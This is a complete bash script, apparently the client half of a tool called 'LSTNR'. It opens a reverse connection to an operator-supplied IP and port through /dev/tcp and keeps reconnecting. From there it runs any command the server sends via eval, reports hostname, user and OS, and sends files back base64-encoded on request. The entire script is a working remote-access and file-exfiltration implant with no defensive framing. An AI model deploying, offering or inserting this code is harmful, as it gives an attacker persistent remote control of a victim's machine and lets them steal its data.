#!/bin/bash

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -s|--server)
            SERVER_IP="$2"
            shift 2
            ;;
        -p|--port)
            SERVER_PORT="$2"
            shift 2
            ;;
        -h|--help)
            echo "Usage: $0 -s SERVER_IP -p PORT"
            echo "LSTNR Client"
            echo ""
            echo "Options:"
            echo "  -s, --server    Server IP address to connect to"
            echo "  -p, --port      Server port to connect to"
            echo "  -h, --help      Show this help message"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Check if required parameters are provided
if [ -z "$SERVER_IP" ] || [ -z "$SERVER_PORT" ]; then
    echo "Error: Server IP and Port are required"
    echo "Usage: $0 -s SERVER_IP -p PORT"
    exit 1
fi

RECONNECT_DELAY=5

# Function to encode file content in base64
encode_file() {
    if [ -f "$1" ]; then
        base64 "$1" 2>/dev/null
        return $?
    fi
    echo "ERROR: File not found or not readable"
    return 1
}

# Function to get OS information
get_os_info() {
    if [ -f "/etc/os-release" ]; then
        . /etc/os-release
        echo "$PRETTY_NAME"
    else
        uname -a
    fi
}

# Function to get username
get_username() {
    whoami 2>/dev/null || echo "unknown"
}

# Function to get hostname
get_hostname() {
    hostname 2>/dev/null || echo "unknown"
}

# Function to execute commands
execute_command() {
    output=$(eval "$1" 2>&1)
    echo "${output:-Command executed with no output}"
}

# Main connection loop
while true; do
    # Create a TCP connection using /dev/tcp
    exec 3>/dev/tcp/$SERVER_IP/$SERVER_PORT 2>/dev/null
    if [ $? -eq 0 ]; then
        exec 4<&3
        echo "[+] Connected to $SERVER_IP:$SERVER_PORT"
        
        # Send initial empty data
        echo -e "\n" >&3
        
        # Main command processing loop
        while true; do
            # Read command from server
            read -r command <&4 || break
            
            echo "[*] Received command: $command"
            
            # Process commands
            case "$command" in
                "die")
                    echo "[!] Received kill-session command. Shutting down..."
                    exec 3>&-
                    exec 4>&-
                    exit 0
                    ;;
                    
                "hostname")
                    response=$(get_hostname)
                    ;;
                    
                "whoami")
                    response=$(get_username)
                    ;;
                    
                "osinfo")
                    response=$(get_os_info)
                    ;;
                    
                getfile:*)
                    filepath="${command#getfile:}"
                    echo "[*] Get file request for: $filepath"
                    response=$(encode_file "$filepath")
                    echo "$response<<EOF>>" >&3
                    continue
                    ;;
                    
                *)
                    response=$(execute_command "$command")
                    ;;
            esac
            
            # Send response back to server
            echo "$response" >&3
        done
        
        # Close file descriptors
        exec 3>&-
        exec 4>&-
    else
        echo "[-] Connection failed"
    fi
    
    echo "[*] Attempting to reconnect in $RECONNECT_DELAY seconds..."
    sleep $RECONNECT_DELAY
done 
